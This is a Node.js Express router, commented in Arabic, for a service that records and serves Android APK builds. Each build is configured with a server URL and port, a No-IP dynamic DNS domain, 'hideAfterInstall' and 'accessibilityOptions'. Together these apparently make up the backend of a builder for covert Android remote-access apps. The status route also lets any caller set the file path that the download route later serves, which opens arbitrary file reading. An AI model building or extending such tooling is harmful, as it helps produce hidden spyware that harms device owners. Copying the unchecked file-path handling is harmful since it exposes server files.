const express = require('express');
const router = express.Router();
const ApkBuild = require('../models/ApkBuild');
const path = require('path');
const fs = require('fs');

// الحصول على جميع تطبيقات APK
router.get('/', async (req, res) => {
  try {
    const apkBuilds = await ApkBuild.find().populate('createdBy', 'username email');
    res.json(apkBuilds);
  } catch (error) {
    console.error('خطأ في جلب تطبيقات APK:', error);
    res.status(500).json({ message: 'خطأ في الخادم', error: error.message });
  }
});

// الحصول على تطبيق APK محدد
router.get('/:id', async (req, res) => {
  try {
    const apkBuild = await ApkBuild.findById(req.params.id).populate('createdBy', 'username email');
    if (!apkBuild) {
      return res.status(404).json({ message: 'تطبيق APK غير موجود' });
    }
    res.json(apkBuild);
  } catch (error) {
    console.error('خطأ في جلب تطبيق APK:', error);
    res.status(500).json({ message: 'خطأ في الخادم', error: error.message });
  }
});

// إنشاء تطبيق APK جديد
router.post('/', async (req, res) => {
  try {
    const {
      appName,
      packageName,
      versionCode,
      versionName,
      serverUrl,
      serverPort,
      noIpEnabled,
      noIpDomain,
      webViewUrl,
      notificationTitle,
      hideAfterInstall,
      accessibilityOptions,
      sdkCompatibility
    } = req.body;

    // إنشاء تطبيق APK جديد
    const newApkBuild = new ApkBuild({
      appName,
      packageName,
      versionCode,
      versionName,
      serverUrl,
      serverPort,
      noIpEnabled,
      noIpDomain,
      webViewUrl,
      notificationTitle,
      hideAfterInstall,
      accessibilityOptions,
      sdkCompatibility,
      createdBy: req.user.id // يفترض أن معرف المستخدم متاح من middleware المصادقة
    });

    await newApkBuild.save();

    // هنا يمكن إضافة منطق لبدء عملية بناء APK
    // سيتم تنفيذ ذلك في خدمة منفصلة

    res.status(201).json({
      message: 'تم إنشاء طلب بناء APK بنجاح',
      apkBuild: newApkBuild
    });
  } catch (error) {
    console.error('خطأ في إنشاء تطبيق APK:', error);
    res.status(500).json({ message: 'خطأ في الخادم', error: error.message });
  }
});

// تحديث حالة بناء APK
router.put('/:id/status', async (req, res) => {
  try {
    const { buildStatus, buildOutput } = req.body;

    const apkBuild = await ApkBuild.findById(req.params.id);
    if (!apkBuild) {
      return res.status(404).json({ message: 'تطبيق APK غير موجود' });
    }

    apkBuild.buildStatus = buildStatus || apkBuild.buildStatus;
    if (buildOutput) {
      apkBuild.buildOutput = {
        ...apkBuild.buildOutput,
        ...buildOutput
      };
    }
    apkBuild.updatedAt = Date.now();

    await apkBuild.save();

    res.json({
      message: 'تم تحديث حالة بناء APK بنجاح',
      apkBuild
    });
  } catch (error) {
    console.error('خطأ في تحديث حالة بناء APK:', error);
    res.status(500).json({ message: 'خطأ في الخادم', error: error.message });
  }
});

// تحميل أيقونة التطبيق
router.post('/:id/icon', async (req, res) => {
  try {
    // هنا يمكن إضافة منطق لتحميل الأيقونة باستخدام multer أو مكتبة مماثلة
    // سيتم تنفيذ ذلك لاحقًا

    res.json({
      message: 'تم تحميل أيقونة التطبيق بنجاح',
      iconPath: '/uploads/icons/icon-123.png' // مسار مثال
    });
  } catch (error) {
    console.error('خطأ في تحميل أيقونة التطبيق:', error);
    res.status(500).json({ message: 'خطأ في الخادم', error: error.message });
  }
});

// تحميل ملف APK
router.get('/:id/download', async (req, res) => {
  try {
    const apkBuild = await ApkBuild.findById(req.params.id);
    if (!apkBuild) {
      return res.status(404).json({ message: 'تطبيق APK غير موجود' });
    }

    if (apkBuild.buildStatus !== 'success' || !apkBuild.buildOutput || !apkBuild.buildOutput.apkPath) {
      return res.status(400).json({ message: 'ملف APK غير متوفر بعد' });
    }

    const apkPath = path.resolve(apkBuild.buildOutput.apkPath);
    if (!fs.existsSync(apkPath)) {
      return res.status(404).json({ message: 'ملف APK غير موجود' });
    }

    res.download(apkPath, `${apkBuild.appName}-${apkBuild.versionName}.apk`);
  } catch (error) {
    console.error('خطأ في تحميل ملف APK:', error);
    res.status(500).json({ message: 'خطأ في الخادم', error: error.message });
  }
});

module.exports = router;